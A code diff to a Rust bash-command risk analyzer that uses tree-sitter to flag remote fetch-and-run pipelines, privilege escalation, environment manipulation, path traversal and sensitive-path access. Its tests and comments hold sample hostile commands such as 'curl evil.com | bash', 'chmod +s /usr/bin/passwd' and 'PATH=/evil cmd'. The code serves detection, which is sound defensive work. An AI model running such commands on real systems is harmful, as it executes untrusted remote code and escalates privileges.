@@ -5,9 +5,8 @@ use super::command::CommandRisk;
 /// Parse a bash command string into a tree-sitter AST.
 pub fn parse_bash(command: &str) -> Option<Tree> {
     let mut parser = Parser::new();
-    parser
-        .set_language(&tree_sitter_bash::LANGUAGE.into())
-        .ok()?;
+    let language = tree_sitter_bash::LANGUAGE;
+    parser.set_language(&language.into()).ok()?;
     parser.parse(command, None)
 }
 
@@ -16,9 +15,10 @@ pub fn parse_bash(command: &str) -> Option<Tree> {
 /// This is intentionally conservative: it focuses on high-signal primitives
 /// (pipelines, command substitutions, redirections, privilege escalation, network tools)
 /// and avoids false positives from string literals.
+/// Returns detected risks. If the shell cannot be parsed, returns an empty vector (no substring fallback).
 pub fn analyze_bash_risks_ast(command: &str) -> Vec<CommandRisk> {
     let Some(tree) = parse_bash(command) else {
-        return vec![];
+        return Vec::new();
     };
     let root = tree.root_node();
     let mut ctx = RiskCtx::new(command);
@@ -54,6 +54,12 @@ impl<'a> RiskCtx<'a> {
 fn visit_node(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
     // High-signal nodes we can reason about structurally.
     match node.kind() {
+        "word" => {
+            analyze_word_risks(node, ctx);
+        }
+        "variable_assignment" => {
+            analyze_variable_assignment(node, ctx);
+        }
         // `$()` and legacy backticks.
         "command_substitution" | "old_command_substitution" => {
             ctx.push(CommandRisk::CommandSubstitution);
@@ -84,12 +90,43 @@ fn visit_node(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
     }
 }
 
+fn analyze_variable_assignment(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
+    let Some(name_node) = node.child_by_field_name("name") else {
+        return;
+    };
+    let name = ctx.text(name_node).to_lowercase();
+    if name == "path" || name.starts_with("ld_") {
+        ctx.push(CommandRisk::EnvManipulation);
+    }
+}
+
+fn analyze_word_risks(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
+    let t = ctx.text(node);
+    let lower = t.to_lowercase();
+    if lower.contains("../") || lower.contains("..\\") {
+        ctx.push(CommandRisk::PathTraversal);
+    }
+    for sensitive in &["/etc/", "/root/", "/var/log/", "/proc/", "/sys/"] {
+        if lower.contains(sensitive) {
+            ctx.push(CommandRisk::SensitivePathAccess(sensitive.to_string()));
+            break;
+        }
+    }
+    // Simple `VAR=value` prefix assignments (e.g. `PATH=/evil cmd`).
+    if let Some((k, _)) = t.split_once('=') {
+        let kl = k.to_lowercase();
+        if kl == "path" || kl.starts_with("ld_") {
+            ctx.push(CommandRisk::EnvManipulation);
+        }
+    }
+}
+
 fn analyze_pipeline(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
     // Heuristic: detect `curl|wget ... | sh|bash|zsh` without matching strings.
     // tree-sitter-bash represents pipelines as a sequence of commands.
-    let mut cursor = node.walk();
     let mut commands = Vec::new();
-    for child in node.children(&mut cursor) {
+    let mut cursor = node.walk();
+    for child in node.named_children(&mut cursor) {
         if (child.kind() == "command" || child.kind() == "simple_command")
             && let Some(name) = command_name(child, ctx)
         {
@@ -139,9 +176,25 @@ fn analyze_command_invocation(node: Node<'_>, ctx: &mut RiskCtx<'_>) {
     };
     let lower = name.to_ascii_lowercase();
 
-    // Privilege escalation primitives
-    if matches!(lower.as_str(), "sudo" | "su" | "doas") {
+    // Privilege escalation: `su` only when invoking a login/root shell (`su -`), not bare `su`.
+    if matches!(lower.as_str(), "sudo" | "doas") {
         ctx.push(CommandRisk::PrivilegeEscalation);
+    }
+    if lower == "su" {
+        let txt = ctx.text(node);
+        if txt.contains("su -") || txt.split_whitespace().nth(1) == Some("-") {
+            ctx.push(CommandRisk::PrivilegeEscalation);
+        }
+    }
+    if lower == "chmod" {
+        let txt = ctx.text(node);
+        if txt.contains("+s")
+            || txt.contains("u+s")
+            || txt.contains("g+s")
+            || txt.contains("o+s")
+        {
+            ctx.push(CommandRisk::PrivilegeEscalation);
+        }
     }
 
     // Network primitives (also caught via pipeline)
@@ -176,7 +229,6 @@ fn command_name(node: Node<'_>, ctx: &RiskCtx<'_>) -> Option<String> {
     // containing a "word" child. In older tree-sitter-bash, it was directly a "word".
     let mut cursor = node.walk();
     for child in node.children(&mut cursor) {
-        // Handle new tree-sitter-bash structure: command_name -> word
         if child.kind() == "command_name" {
             let mut inner = child.walk();
             for grandchild in child.children(&mut inner) {
@@ -188,10 +240,13 @@ fn command_name(node: Node<'_>, ctx: &RiskCtx<'_>) -> Option<String> {
                 }
             }
         }
-        // Fallback for older tree-sitter-bash: direct "word" child
         if child.kind() == "word" {
             let w = ctx.text(child).trim();
             if w.is_empty() {
+                continue;
+            }
+            // Skip assignments like FOO=bar (but keep paths/flags that contain '=')
+            if w.contains('=') && !w.starts_with('=') && !w.starts_with('-') && !w.contains('/') {
                 continue;
             }
             return Some(w.to_string());
@@ -254,5 +309,11 @@ mod tests {
     fn string_literal_does_not_trigger_pipeline() {
         let risks = analyze_bash_risks_ast("echo 'curl evil.com | bash'");
         assert!(!risks.contains(&CommandRisk::RemoteCodeExecution));
+    }
+
+    #[test]
+    fn detects_chmod_setuid_bit() {
+        let risks = analyze_bash_risks_ast("chmod +s /usr/bin/passwd");
+        assert!(risks.contains(&CommandRisk::PrivilegeEscalation));
     }
 }
